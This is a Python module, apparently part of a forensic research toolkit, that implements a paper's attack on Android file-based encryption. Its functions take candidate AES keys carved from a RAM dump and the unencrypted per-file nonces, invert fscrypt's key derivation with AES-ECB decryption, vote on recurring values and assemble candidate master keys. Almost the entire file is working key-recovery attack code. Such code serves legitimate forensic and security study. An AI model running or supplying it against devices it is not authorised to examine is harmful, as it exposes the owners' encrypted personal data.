"""
Core attack (paper Section 3.2): recover Android FBE master keys from a
pool of candidate 256-bit AES keys (found anywhere in a RAM dump by
aeskeyfind) plus the per-file nonces that share a master-key descriptor
(read from the filesystem's extended attributes).

Android's fscrypt derive_key_aes() (fs/crypto/keyinfo.c, Listing 1 in the
paper) computes:

    DEKf = AES-128-ECB-Encrypt(key=nonce, plaintext=MK)

applied blockwise over the 512-bit (4-block) master key, using the
16-byte file nonce as the AES key. Because the file nonce is stored
*unencrypted* on disk, and AES-ECB is a permutation, this is directly
invertible:

    MK = AES-128-ECB-Decrypt(key=nonce, ciphertext=DEKf)

aeskeyfind cannot see nonces -- it only reports raw 256-bit AES key
schedules found anywhere in memory. So for a given master-key descriptor,
we try every (candidate key, nonce) pair from that descriptor's bin, and
count how often each resulting 256-bit value recurs. Because AES decrypts
*wrong* keys into effectively random noise, any value that recurs across
multiple distinct pairs is overwhelmingly likely to be a real half of the
master key -- this is exactly the voting behavior shown in Fig. 4 of the
paper.
"""
from __future__ import annotations

from collections import Counter
from dataclasses import dataclass
from typing import Dict, List, Sequence, Tuple

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

AES_BLOCK = 16


def aes128_ecb_decrypt_block(key16: bytes, data: bytes) -> bytes:
    """Decrypts `data` (a multiple of 16 bytes) with AES-128-ECB using
    `key16` as the key. This inverts derive_key_aes() one block at a
    time, since ECB mode processes each block independently."""
    if len(key16) != 16:
        raise ValueError("nonce/key must be 16 bytes")
    if len(data) % AES_BLOCK != 0:
        raise ValueError("data must be a multiple of the AES block size")
    decryptor = Cipher(algorithms.AES(key16), modes.ECB()).decryptor()
    return decryptor.update(data) + decryptor.finalize()


@dataclass
class HalfKeyCandidate:
    value: bytes
    hits: int


def recover_master_key_halves(
    candidate_keys: Sequence[bytes], nonces: Sequence[bytes], top_n: int = 4
) -> List[HalfKeyCandidate]:
    """For one master-key-descriptor "bin": try every (candidate_key, nonce)
    combination, decrypt, and count recurring 256-bit results. Returns the
    `top_n` most frequent distinct values, highest count first -- the real
    master-key halves should dominate the top of this list (paper Fig. 4)."""
    counts: Counter = Counter()
    for fk in candidate_keys:
        if len(fk) != 32:
            continue
        for nonce in nonces:
            if len(nonce) != 16:
                continue
            half = aes128_ecb_decrypt_block(nonce, fk)
            counts[half] += 1

    return [
        HalfKeyCandidate(value=value, hits=hits)
        for value, hits in counts.most_common(top_n)
    ]


def build_master_key_candidates(
    halves: Sequence[HalfKeyCandidate], max_candidates: int = 2
) -> List[bytes]:
    """Concatenates the top halves (both orders) into 512-bit (64-byte)
    master-key candidates. The paper notes the most-counted half is
    typically the first half, the second-most-counted is the second half,
    but both orders are returned since this is a heuristic, not a
    certainty -- verify with fbe_forensic_toolkit before trusting one."""
    top = halves[: max_candidates + 1]
    candidates: List[bytes] = []
    for i in range(len(top)):
        for j in range(len(top)):
            if i == j:
                continue
            candidates.append(top[i].value + top[j].value)
    return candidates


def group_nonces_by_descriptor(
    contexts, skip_new_kdf: bool = True
) -> Dict[str, List[bytes]]:
    """Buckets EncryptionContext.nonce by key_descriptor_hex. Descriptors
    whose files use the AES-256-HEH filename mode are flagged by the paper
    (Section 3.2, 7) as using a newer KDF this attack does not break, and
    are skipped by default."""
    bins: Dict[str, List[bytes]] = {}
    skipped: set = set()
    for ctx in contexts:
        if skip_new_kdf and ctx.uses_new_kdf:
            skipped.add(ctx.key_descriptor_hex)
            continue
        bins.setdefault(ctx.key_descriptor_hex, []).append(ctx.nonce)

    for descriptor in skipped:
        bins.pop(descriptor, None)
    if skipped:
        print(
            f"[master_key_recovery] skipping {len(skipped)} descriptor(s) using the "
            f"new (AES-256-HEH-indicated) KDF, not vulnerable to this attack: "
            f"{', '.join(sorted(skipped))}"
        )
    return bins
